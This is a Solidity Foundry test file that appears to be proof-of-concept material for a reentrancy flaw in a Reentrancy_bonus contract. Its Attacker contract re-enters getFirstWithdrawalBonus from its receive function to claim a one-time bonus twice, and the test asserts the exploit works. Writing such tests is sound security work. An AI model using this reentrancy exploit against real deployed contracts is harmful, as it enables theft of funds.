
// SPDX-License-Identifier: MIT
pragma solidity 0.8.29;

import {Test} from "../lib/forge-std/src/Test.sol";
import {Reentrancy_bonus} from "../src/Reentrancy_bonus.sol";

contract TestReentrancyReentrancy_bonus is Test {
    Reentrancy_bonus public _contractUnderTest;
    Attacker public _attacker;

    function setUp() public {
        _contractUnderTest = new Reentrancy_bonus();
        _attacker = new Attacker(address(_contractUnderTest));
    }

    function test_attackerCallsMultipleTimes(uint256 attackVal) public {
        // Constrain the fuzz value to a safe range
        vm.assume(attackVal > 0.01 ether && attackVal < type(uint128).max);

        // Fund the victim contract so it has ETH to send as bonus
        vm.deal(address(_contractUnderTest), attackVal * 10);
        
        // Fund the attacker contract
        vm.deal(address(_attacker), attackVal);

        // Fund the test contract
        vm.deal(address(this), attackVal);

        // Trigger the attack
        _attacker.attack();

        // Verify the exploit succeeded (bonus claimed multiple times)
        assertTrue(_attacker.exploitSucceeded(), "Reentrancy attack failed: exploitSucceeded flag was not set.");
    }

    receive() external payable {}
}

contract Attacker {
    Reentrancy_bonus public _victim;
    
    uint256 public attackCallCount;
    bool public exploitSucceeded;
    uint256 public totalBonusReceived;

    constructor(address victimAddress) { 
        _victim = Reentrancy_bonus(victimAddress);
    }

    function attack() public {
        // Reset state for the attack
        attackCallCount = 0;
        exploitSucceeded = false;
        totalBonusReceived = 0;

        // Call the vulnerable function - this should only give us 100 wei bonus once
        // But due to reentrancy, we can get it multiple times
        _victim.getFirstWithdrawalBonus(address(this));

        // If we received the callback more than once, the exploit succeeded
        // The vulnerability allows us to re-enter before claimedBonus is set to true
        if (attackCallCount > 1) {
            exploitSucceeded = true;
        }
    }

    receive() external payable {
        attackCallCount++;
        totalBonusReceived += msg.value;
        
        // Re-enter the vulnerable function before claimedBonus[recipient] is set to true
        // The check require(!claimedBonus[recipient]) will pass because the state
        // hasn't been updated yet
        if (attackCallCount < 2) {
            _victim.getFirstWithdrawalBonus(address(this));
        }
    }
}
